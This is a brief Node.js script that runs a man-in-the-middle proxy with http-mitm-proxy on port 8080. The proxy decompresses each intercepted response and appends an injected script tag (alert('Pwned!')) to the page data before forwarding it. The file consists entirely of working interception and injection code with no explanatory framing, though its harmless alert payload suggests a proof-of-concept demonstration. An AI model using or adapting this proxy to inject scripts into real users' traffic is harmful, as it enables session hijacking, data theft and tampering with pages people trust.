const Proxy = require('http-mitm-proxy');

const proxy = Proxy();

const PORT = 8080;

proxy.onError((ctx, err) => {
  // eslint-disable-next-line
  console.error('proxy error:', err);
});

proxy.onRequest((ctx1, cb1) => {
  // console.log('isSSL?', ctx1.isSSL);
  // console.log('host!', ctx1.proxyToServerRequestOptions.host);
  ctx1.use(Proxy.gunzip);
  ctx1.onResponseData((ctx, chunk, callback) => {
    const newchunk = new Buffer(
      chunk.toString().concat(`<script>alert('Pwned!')</script>`),
    );
    console.log(newchunk.toString());
    return callback(null, newchunk);
  });
  return cb1();
});

proxy.listen({ port: PORT });

console.log(`Proxy running on ${PORT} -- awaiting incoming connections...`);
